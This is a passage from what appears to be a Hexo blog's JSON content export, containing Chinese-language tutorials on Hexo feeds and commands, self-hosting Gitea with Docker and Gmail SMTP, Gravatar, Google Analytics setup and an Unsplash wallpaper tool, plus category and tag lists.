posts by &quot;$&#123;tag&#125;&quot; tag` : &#x27;&#x27;) + (category ? ` • All posts by &quot;$&#123;category&#125;&quot; category` : &#x27;&#x27;), description: config.description, home_page_url: config.url, items: posts.map(post =&gt; (&#123; id: post.permalink, url: post.permalink, title: post.title, date_published: moment(post.date).toISOString(), content_html: post.content || &#x27;&#x27;, tags: (post.tags ? post.tags.toArray() : []).map((&#123; name &#125;) =&gt; name) &#125;))&#125;, null, 4) _%&gt; 設定修改 Heox 設定檔 _config.yml 新增 feed 設定 feed: limit: 20 order_by: &quot;-date&quot; tag_dir: &quot;tag&quot; category_dir: &quot;category&quot; rss: enable: true template: &quot;themes/layout/template/rss.ejs&quot; output: &quot;rss.xml&quot; atom: enable: true template: &quot;themes/layout/template/atom.ejs&quot; output: &quot;atom.xml&quot; jsonFeed: enable: true template: &quot;themes/layout/template/json.ejs&quot; output: &quot;feed.json&quot; 詳細設定參考 GitHub 完成接下來只要重新佈署 hexo 即可 hexo server 檢查這些網址看是否安裝成功 http://localhost:4000/rss.xml http://localhost:4000/atom.xml http://localhost:4000/feed.json","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"}]},{"title":"自動換桌布 unsplash-wallpapers","slug":"unsplash-wallpapers","date":"2021-12-06T11:05:56.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2021/12/06/unsplash-wallpapers/","link":"","permalink":"https://zonego.tw/2021/12/06/unsplash-wallpapers/","excerpt":"自動換桌布的方案有很多 在 Windows 上比較有名的是 Wallpaper Engine，除了一般的圖片之外，還可以將影片、靜態網頁做成桌布 跨平台的方案則有微軟的 bing wallpaper","text":"自動換桌布的方案有很多 在 Windows 上比較有名的是 Wallpaper Engine，除了一般的圖片之外，還可以將影片、靜態網頁做成桌布 跨平台的方案則有微軟的 bing wallpaper UnsplashUnsplash 是一個免費的相片共享網站攝影師可以將相片上傳到 Unsplash，相片編輯者們會對使用者上傳的相片進行整理Unsplash 使用了較為自由的著作權許可條款，這讓 Unsplash 上的相片經常在文章配圖中出現 想當然，官方也推出像 bing wallpaper 一樣的自動桌布工具在這裡但只有 iOS MAC AppleTV 以及 chrome 能使用 但PC平台才是大神開發者的發源地，這種小問題已經有人解決了 unsplash-wallpapers這次要介紹的就是基於Unsplash圖庫的開源小工具 unsplash-wallpapers Github 特點 支援 Windows MAC Linux 系統 紀錄更換過的歷史桌布. 可設定自動更換週期，每小時、每天、每周、手動 下載桌布原圖 範例 下載下載點請到 Github Release 依據你的系統下載定應安裝檔 MAC 系統下載 .dmgWindows 下載 .exeRedhat、Centos 下載 .rpmdebain、Ubuntu 下載 .deb要自行編譯就下載 Sorce code 裝完就可以享受定時自動換桌布啦🎉","categories":[{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"},{"name":"桌布","slug":"桌布","permalink":"https://zonego.tw/tags/%E6%A1%8C%E5%B8%83/"}]},{"title":"Gitea - Git 自架伺服器首選","slug":"gitea","date":"2021-11-25T11:22:30.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2021/11/25/gitea/","link":"","permalink":"https://zonego.tw/2021/11/25/gitea/","excerpt":"","text":"作為寫過程式的人，Git是必備工具 除非只是寫好玩的 常見的線上Git儲藏庫就是 GitHub、Gitlab、Bitbucket 對於這些公開平台不放心，或是程式碼不想外流，那就自己架私服吧! 常見的有 Gitea、gogs或是Gitlab Gitlab裡面包含 CI&#x2F;CD 工具等功能，十分肥大 想要一個安裝簡單、功能近似GitHub又有中文介面，那就選 Gitea 吧！ 安裝說明文件 Gitea 提供很多安裝方式，我這邊選則用 docker 手邊有現成的docker伺服器，不用白不用 docker-compose 安裝說明 選擇版本Gitea 的官方映像可以在 Docker Hub 找到 版本 tag 與 Gitea 的 Github 上發布的版本號一樣 latest 則是最新的穩定版 選擇資料庫Gitea 支援多種資料庫，例如 mysql mariadb PostgreSQL 安裝過程使用 docker-compose 安裝 我這邊選用 mysql 資料庫 docker-compose.yml version: &quot;2&quot;services: server: image: gitea/gitea:1.15.6-rootless environment: - GITEA__database__DB_TYPE=mysql - GITEA__database__HOST=db:3306 - GITEA__database__NAME=gitea - GITEA__database__USER=gitea - GITEA__database__PASSWD=gitea restart: always volumes: - ./data:/var/lib/gitea - ./config:/etc/gitea - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro ports: - &quot;10080:3000&quot; - &quot;10022:22&quot; depends_on: - db db: image: mysql:8 restart: always environment: - MYSQL_ROOT_PASSWORD=gitea - MYSQL_USER=gitea - MYSQL_PASSWORD=gitea - MYSQL_DATABASE=gitea volumes: - ./mysql:/var/lib/mysql 執行 docker-compose up 完成後可以用 http://hostname:10080 連到你剛剛架的 gitea SSH 要使用 10022 例如 git clone ssh://git@hostname:10022/username/repo.git 如果想用預設 Port #將這段ports: - &quot;10080:3000&quot; - &quot;10022:22&quot;#換成這段ports: - &quot;80:3000&quot; - &quot;22:22&quot;","categories":[{"name":"Home Lab","slug":"Home-Lab","permalink":"https://zonego.tw/categories/Home-Lab/"}],"tags":[{"name":"Self-Hosting","slug":"Self-Hosting","permalink":"https://zonego.tw/tags/Self-Hosting/"},{"name":"Git","slug":"Git","permalink":"https://zonego.tw/tags/Git/"},{"name":"Gitea","slug":"Gitea","permalink":"https://zonego.tw/tags/Gitea/"}]},{"title":"大頭貼服務 Gravatar","slug":"gravatar","date":"2021-11-22T08:30:59.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2021/11/22/gravatar/","link":"","permalink":"https://zonego.tw/2021/11/22/gravatar/","excerpt":"","text":"辦完帳號設定大頭貼是使用大多數服務的必經之路，今天就是要來解決需要重複上串大頭貼的問題! (希望可以…) GravatarGravatar 是多個網站支援的大頭貼服務，Slack、GitHub、WordPress 等大型網站都有支援。只需在這邊設定完大頭貼，就可以一次套用。 除了提供大頭貼，Gravatar 也提供類似線上名片的功能。你可以在上面放你的網站、email等公開資訊。 不過我沒在用 使用大頭貼參考官方文件的使用方法 裡面有個方便的用法：取得大頭貼的大頭貼的URL有URL後在，大多數網頁或是可串接網路圖片的地方都可以嵌入 如果不能用，一定是你還沒上傳大頭貼 大頭貼的網址長這樣，HASH的部分要替換成email的md5 hash值 https://www.gravatar.com/avatar/HASH 如果不知道怎麼找對應的hash值，可以在這裏產生對應的產生對應的md5 hash 例如我email的hash值找到是 0b1d2b9d95375cc6af5909e145fb4a06我的大頭貼網址就是 https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06 ![大頭貼](https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06)","categories":[{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/categories/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"}],"tags":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"},{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"}]},{"title":"Hexo nexmoe 主題套用 Google Analytics","slug":"hexo-GA","date":"2021-11-16T07:44:43.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2021/11/16/hexo-GA/","link":"","permalink":"https://zonego.tw/2021/11/16/hexo-GA/","excerpt":"Google Analytics（GA）是Google公司提供的數據分析工具，可以幫助你追蹤你的網站流量、用戶行為，是一個網路行銷重要又好用的小工具。","text":"Google Analytics（GA）是Google公司提供的數據分析工具，可以幫助你追蹤你的網站流量、用戶行為，是一個網路行銷重要又好用的小工具。 網路上會看到很多推薦使用 GA 的文章，有甚麼功能就不用我多說了 絕對不是我想偷懶。 我這小小的部落格也就只有看人數的需求而已。 申請 Google Analytics基本上你有 google 帳號就完成一半了，接下來到 GA網站 接著在左下角管理 &gt; 建立資源 &gt; 完成後到資料串流 新增網站串流，裡面填入要分析的網站網址，以及名稱 完成後我們會得到需要的 評估ID G-XXXXX 的這串ID 修改Hexo設定檔3.0 版設定方式nexmoe 這個主題有支援 Google Analytics 只要在 _config.nexmoe.yml 設定檔內調整分析的設定即可 analytics: google_site_id: #&lt;ID&gt; gtags_site_id: 這邊填入分析ID G-XXXXX cnzz_site_id: #&lt;ID&gt; tencent_site_id: #&lt;ID&gt; la_site_id: #&lt;ID&gt; baidu_site_id: #&lt;ID&gt; gtm_container_id: #&lt;ID&gt; 4.0 版設定方式照前面申請 Google Analytics 的步驟，先到資料串流設定 按一下「管理」。 使用「資源」欄頂端的下拉式選取器，選擇要在哪個資源設定資料串流的 Google 代碼。 在「資源」欄中，按一下「資料串流」。 照下圖複製 打開 _config.nexmoe.yml 設定檔內在 slotHead 下面貼上複製的嵌入碼 ...slotHead: | &lt;!-- Google tag (gtag.js) --&gt; &lt;script async src=&quot;https://www.googletagmanager.com/gtag/js?id=G-ID&quot;&gt;&lt;/script&gt; &lt;script&gt; window.dataLayer = window.dataLayer || []; function gtag()&#123;dataLayer.push(arguments);&#125; gtag(&#x27;js&#x27;, new Date()); gtag(&#x27;config&#x27;, &#x27;G-ID&#x27;); &lt;/script&gt;... 成果設定完後重開 Hexo 伺服器套用 在GA網站 &gt; 報表內看到我們要的瀏覽人數 網站果然沒有人看，人數是0 其實是截圖時根本還沒重開 Hexo，所以 Google 根本沒抓到瀏覽紀錄","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"},{"name":"Google","slug":"Google","permalink":"https://zonego.tw/tags/Google/"}]},{"title":"Gitea 使用 Gmail 寄信","slug":"gitea-gmail","date":"2021-11-14T04:39:30.000Z","updated":"2024-12-25T01:42:31.141Z","comments":true,"path":"2021/11/14/gitea-gmail/","link":"","permalink":"https://zonego.tw/2021/11/14/gitea-gmail/","excerpt":"","text":"建立 Gmail 應用程式密碼Google 基於安全性，禁用直接用密碼存取 smtp取而代之要先建立應用程式密碼，代替原本密碼的功能 管理 Google 帳戶 &gt; 安全性 &gt; 登入 Google &gt; 應用程式密碼 應用選郵件，裝置只是方便管理的名稱，可以選其他自己寫 完成後會產生一組密碼，建議用完之後就忘掉他，下次要用忘記時再建新的就好 設定 container 環境變數我的 gitea 是使用 Docker 架的 gitea 官方鏡像有提供透過環境變數設定，不用另外修改設定檔 environment: - GITEA__mailer__ENABLED=true - GITEA__mailer__FROM=寄件者信箱 - GITEA__mailer__MAILER_TYPE=smtp - GITEA__mailer__HOST=smtp.gmail.com:465 - GITEA__mailer__IS_TLS_ENABLED=true - GITEA__mailer__USER=你的Gmail - GITEA__mailer__PASSWD=應用程式密碼 改完之後到 Gitea 網站 &gt; 網站管理 &gt; 組態往下捲找到 SMTP 組態，可以測試寄信 詳細參考","categories":[{"name":"Home Lab","slug":"Home-Lab","permalink":"https://zonego.tw/categories/Home-Lab/"}],"tags":[{"name":"Google","slug":"Google","permalink":"https://zonego.tw/tags/Google/"},{"name":"Git","slug":"Git","permalink":"https://zonego.tw/tags/Git/"},{"name":"Gitea","slug":"Gitea","permalink":"https://zonego.tw/tags/Gitea/"},{"name":"GMail","slug":"GMail","permalink":"https://zonego.tw/tags/GMail/"}]},{"title":"Hexo 基本使用教學","slug":"hexo","date":"2021-11-13T04:30:30.000Z","updated":"2024-12-25T01:42:31.145Z","comments":true,"path":"2021/11/13/hexo/","link":"","permalink":"https://zonego.tw/2021/11/13/hexo/","excerpt":"官網使用說明GitHub.","text":"官網使用說明GitHub. 常用指令建新貼文hexo new 文章名稱 詳細請看: Writing 啟動測試伺服器Hexo 提供 Web server 功能，不須透過 Nginx 或是 apache 安裝 npm install hexo-server --save 啟動伺服器 hexo server 詳細請看: Server 產生靜態網站檔案hexo generate 詳細請看: Generating 部署到網站伺服器hexo deploy 產生靜態頁面後佈署兩個指令相同 hexo generate --deployhexo deploy --generate 詳細請看: Deployment 增加文章分類 (Categories)指令開啟分類功能 hexo new page categories 新文章增加分類，只要在新貼文的標頭加上 categories ---title: 2021-11-00date: 2021-11-00 10:10categories: 這裡寫分類--- 增加文章標籤 (Tags)指令開啟標籤功能 hexo new page tags 新文章增加標籤，也是在新貼文的標頭加上 tags ---title: 2021-11-00date: 2021-11-00 10:10tags: - 第一個標籤- 第二個標籤--- 修改新文章預設標頭修改 scaffolds/post.md title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories: &#123;&#123; categories &#125;&#125;tags: &#123;&#123; tags &#125;&#125; 這樣每次新增文章就會自動添加分類及標籤","categories":[{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"},{"name":"Self-Hosting","slug":"Self-Hosting","permalink":"https://zonego.tw/tags/Self-Hosting/"}]}],"categories":[{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/categories/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/categories/Blog/"},{"name":"Home Lab","slug":"Home-Lab","permalink":"https://zonego.tw/categories/Home-Lab/"},{"name":"小工具","slug":"小工具","permalink":"https://zonego.tw/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/"},{"name":"系統設定","slug":"系統設定","permalink":"https://zonego.tw/categories/%E7%B3%BB%E7%B5%B1%E8%A8%AD%E5%AE%9A/"},{"name":"DIY","slug":"DIY","permalink":"https://zonego.tw/categories/DIY/"},{"name":"開發相關","slug":"開發相關","permalink":"https://zonego.tw/categories/%E9%96%8B%E7%99%BC%E7%9B%B8%E9%97%9C/"}],"tags":[{"name":"網路資源","slug":"網路資源","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF%E8%B3%87%E6%BA%90/"},{"name":"字型","slug":"字型","permalink":"https://zonego.tw/tags/%E5%AD%97%E5%9E%8B/"},{"name":"Hexo","slug":"Hexo","permalink":"https://zonego.tw/tags/Hexo/"},{"name":"Blog","slug":"Blog","permalink":"https://zonego.tw/tags/Blog/"},{"name":"搜尋引擎","slug":"搜尋引擎","permalink":"https://zonego.tw/tags/%E6%90%9C%E5%B0%8B%E5%BC%95%E6%93%8E/"},{"name":"Google","slug":"Google","permalink":"https://zonego.tw/tags/Google/"},{"name":"廣告","slug":"廣告","permalink":"https://zonego.tw/tags/%E5%BB%A3%E5%91%8A/"},{"name":"Self-Hosting","slug":"Self-Hosting","permalink":"https://zonego.tw/tags/Self-Hosting/"},{"name":"Windows","slug":"Windows","permalink":"https://zonego.tw/tags/Windows/"},{"name":"Linux","slug":"Linux","permalink":"https://zonego.tw/tags/Linux/"},{"name":"DNS","slug":"DNS","permalink":"https://zonego.tw/tags/DNS/"},{"name":"Wiki JS","slug":"Wiki-JS","permalink":"https://zonego.tw/tags/Wiki-JS/"},{"name":"Keyckoak","slug":"Keyckoak","permalink":"https://zonego.tw/tags/Keyckoak/"},{"name":"身分認證","slug":"身分認證","permalink":"https://zonego.tw/tags/%E8%BA%AB%E5%88%86%E8%AA%8D%E8%AD%89/"},{"name":"網站架設","slug":"網站架設","permalink":"https://zonego.tw/tags/%E7%B6%B2%E7%AB%99%E6%9E%B6%E8%A8%AD/"},{"name":"Cloudflare","slug":"Cloudflare","permalink":"https://zonego.tw/tags/Cloudflare/"},{"name":"靜態網站","slug":"靜態網站","permalink":"https://zonego.tw/tags/%E9%9D%9C%E6%85%8B%E7%B6%B2%E7%AB%99/"},{"name":"Git","slug":"Git","permalink":"https://zonego.tw/tags/Git/"},{"name":"網路","slug":"網路","permalink":"https://zonego.tw/tags/%E7%B6%B2%E8%B7%AF/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://zonego.tw/tags/Ubuntu/"},{"name":"Mac","slug":"Mac","permalink":"https://zonego.tw/tags/Mac/"},{"name":"環境變數","slug":"環境變數","permalink":"https://zonego.tw/tags/%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"},{"name":"套件管理","slug":"套件管理","permalink":"https://zonego.tw/tags/%E5%A5%97%E4%BB%B6%E7%AE%A1%E7%90%86/"},{"name":"Apple Silicon","slug":"Apple-Silicon","permalink":"https://zonego.tw/tags/Apple-Silicon/"},{"name":"VM 虛擬機","slug":"VM-虛擬機","permalink":"https://zonego.tw/tags/VM-%E8%99%9B%E6%93%AC%E6%A9%9F/"},{"name":"資安","slug":"資安","permalink":"https://zonego.tw/tags/%E8%B3%87%E5%AE%89/"},{"name":"DIY","slug":"DIY","permalink":"https://zonego.tw/tags/DIY/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://zonego.tw/tags/CI-CD/"},{"name":"Drone","slug":"Drone","permalink":"https://zonego.tw/tags/Drone/"},{"name":"桌布","slug":"桌布","permalink":"https://zonego.tw/tags/%E6%A1%8C%E5%B8%83/"},{"name":"Gitea","slug":"Gitea","permalink":"https://zonego.tw/tags/Gitea/"},{"name":"GMail","slug":"GMail","permalink":"https://zonego.tw/tags/GMail/"}]}